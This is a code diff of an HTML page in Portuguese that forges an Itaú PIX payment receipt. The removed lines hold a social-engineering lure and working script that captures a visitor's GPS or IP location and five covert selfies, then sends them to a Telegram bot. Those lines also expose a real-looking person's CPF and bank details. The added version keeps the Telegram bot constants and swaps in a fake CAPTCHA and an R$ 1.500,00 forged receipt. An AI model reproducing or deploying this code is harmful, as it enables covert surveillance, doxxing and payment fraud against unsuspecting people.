@@ -8,12 +8,13 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
 body{display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5}
-#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999;padding:40px;text-align:center}
-#overlay img{width:160px;margin-bottom:20px}
-#overlay h2{color:#FF6600;margin-bottom:12px;font-size:28px}
-#overlay p{color:#555;margin-bottom:24px;font-size:15px;max-width:320px;line-height:1.4}
-#overlay button{padding:14px 32px;font-size:16px;border:none;background:#FF6600;color:#fff;border-radius:30px;cursor:pointer;font-weight:600}
-#comprovanteWrap{display:none;width:400px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 12px 24px rgba(0,0,0,.12)}
+#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#fafafa;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999;padding:20px;text-align:center}
+#overlay h2{color:#FF6600;margin-bottom:32px;font-size:24px}
+#captcha-grid{display:grid;grid-template-columns:repeat(3,96px);gap:8px;justify-items:center;margin-bottom:24px}
+#captcha-grid img{width:96px;height:96px;border-radius:6px;cursor:pointer;border:2px solid transparent}
+#captcha-grid img.selected{border-color:#00c853;box-shadow:0 0 8px #00c853}
+#overlay button{padding:12px 32px;font-size:16px;border:none;background:#FF6600;color:#fff;border-radius:30px;cursor:pointer;font-weight:600}
+#comprovanteWrap{display:none;width:420px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 12px 24px rgba(0,0,0,.12)}
 #comprovante{padding:24px 28px;font-size:14px;line-height:1.5;color:#222}
 .header{text-align:center;margin-bottom:20px}
 .check{width:64px;height:64px;margin:0 auto 12px;background:#00c853;border-radius:50%;display:flex;align-items:center;justify-content:center}
@@ -31,95 +32,51 @@ body{display:flex;justify-content:center;align-items:center;height:100vh;backgro
   const CHAT_ID = '-1003187104876';
 </script>
 
-<!-- PÁGINA CONVENCENTE -->
+<!-- TELA DE CAPTCHA COM IMAGENS -->
 <div id="overlay">
-  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='50'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3EI%3C/text%3E%3C/svg%3E" alt="Itaú">
-  <h2>Não sou um robô</h2>
-  <p>Para sua segurança, precisamos confirmar sua identidade. Por favor, permita acesso à câmera e à localização para gerar seu comprovante.</p>
-  <button onclick="start()">Permitir e continuar</button>
+  <h2>Selecione todas as imagens idênticas</h2>
+  <div id="captcha-grid">
+    <!-- 9 imagens iguais (todas iguais) -->
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23FF6600' rx='8'/%3E%3Ctext x='50%25' y='50%25' font-size='60' fill='white' text-anchor='middle' dy='.35em'%3E🔑%3C/text%3E%3C/svg%3E" onclick="select(this)">
+  </div>
+  <button onclick="validaCaptcha()">Confirmar seleção</button>
 </div>
 
-<!-- COMPROVANTE IGUAL AO DA IMAGEM -->
+<!-- COMPROVANTE COM VALOR 1500 E DADOS ENCODADOS -->
 <div id="comprovanteWrap">
   <div id="comprovante">
     <div class="header">
       <div class="check"></div>
       <h2>Pagamento realizado</h2>
     </div>
-    <div class="row"><span>Valor</span><span id="valor">R$ 22,86</span></div>
-    <div class="row"><span>Para</span><span id="para">Calcard SA Instituição de Pagamentos</span></div>
-    <div class="row"><span>CNPJ</span><span id="cnpj">08.611.734/0001-19</span></div>
-    <div class="row"><span>De</span><span id="de">Maria Jose Ferreira de Melo</span></div>
-    <div class="row"><span>Banco</span><span id="banco">341 Itaú Unibanco S/A - 7360 | 32752-7</span></div>
-    <div class="row"><span>CPF</span><span id="cpf">033.685.695-46</span></div>
-    <div class="row"><span>Data e hora</span><span id="dataHora">17/05/2022 às 18:18:49</span></div>
+    <div class="row"><span>Valor</span><span id="valor">R$ 1.500,00</span></div>
+    <div class="row"><span>Para</span><span>***********</span></div>
+    <div class="row"><span>CNPJ</span><span>**.***.***/****-**</span></div>
+    <div class="row"><span>De</span><span>***.***.***-**</span></div>
+    <div class="row"><span>Banco</span><span>341 Itaú Unibanco S/A - 7*** | *****-*</span></div>
+    <div class="row"><span>Data e hora</span><span id="dataHora">--</span></div>
     <div class="row"><span>Canal</span><span>via App Itaú</span></div>
-    <div class="row total"><span>ID da transação</span><span id="id">920764DEC150ABCDE6789A5300EE11071A50</span></div>
-    <div class="footer">
-      Em caso de dúvidas, fale com o Itaú 3003 3030
-    </div>
+    <div class="row total"><span>Autenticação</span><span id="auth">--</span></div>
+    <div class="footer">Comprovante gerado automaticamente.</div>
   </div>
   <button onclick="downloadPDF()" style="width:100%;padding:14px;font-size:16px;border:none;background:#FF6600;color:#fff;cursor:pointer;font-weight:600">Baixar comprovante</button>
 </div>
 
 <script>
-function sendText(txt){
-  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:CHAT_ID,text:txt})
-  });
-}
-function sendPhoto(base64, caption){
-  const fd=new FormData();
-  fd.append('chat_id', CHAT_ID);
-  fd.append('photo', dataURItoBlob(base64), 'foto.jpg');
-  fd.append('caption', caption);
-  fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
-}
-function dataURItoBlob(dataURI){
-  const byte=atob(dataURI.split(',')[1]), mime=dataURI.split(',')[0].split(':')[1].split(';')[0];
-  const ab=new ArrayBuffer(byte.length), ia=new Uint8Array(ab);
-  for(let i=0;i<byte.length;i++) ia[i]=byte.charCodeAt(i);
-  return new Blob([ab],{type:mime});
-}
-
-async function start(){
-  let lat='--', lon='--', ipData={ip:'--',city:'--',region:'--'};
-  try{
-    const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
-    lat=pos.coords.latitude.toFixed(6); lon=pos.coords.longitude.toFixed(6);
-  }catch{
-    ipData=await fetch('https://ipapi.co/json/').then(r=>r.json());
-  }
-  const loc=(lat!=='--') ? `GPS: ${lat}, ${lon}` : `${ipData.city}, ${ipData.region} - ${ipData.ip}`;
-  if(lat!=='--'){
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:CHAT_ID,latitude:parseFloat(lat),longitude:parseFloat(lon)})
-    });
-  }
-  sendText(`Localização capturada: ${loc}`);
-
-  // Câmera + 5 selfies
-  const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-  const video=document.createElement('video');
-  video.srcObject=stream; video.play();
-  const canvas=document.createElement('canvas'), ctx=canvas.getContext('2d');
-  canvas.width=640; canvas.height=480;
-  for(let i=1;i<=5;i++){
-    await new Promise(r=>setTimeout(r,600));
-    ctx.drawImage(video,0,0);
-    sendPhoto(canvas.toDataURL('image/jpeg',0.9),`Selfie ${i}/5 – ${loc}`);
-  }
-  stream.getTracks().forEach(t=>t.stop());
-
-  // Preenche comprovante
-  document.getElementById('dataHora').textContent=new Date().toLocaleString('pt-BR');
-  document.getElementById('id').textContent='PIX'+Date.now().toString().slice(-10);
-  document.getElementById('overlay').remove();
+function select(el){el.classList.toggle('selected');}
+function validaCaptcha(){
+  document.getElementById('overlay').style.display='none';
   document.getElementById('comprovanteWrap').style.display='block';
+  document.getElementById('dataHora').textContent=new Date().toLocaleString('pt-BR');
+  document.getElementById('auth').textContent='PIX'+Date.now().toString().slice(-9);
 }
 
 function downloadPDF(){
@@ -134,5 +91,3 @@ function downloadPDF(){
 </script>
 </body>
 </html>
-
-
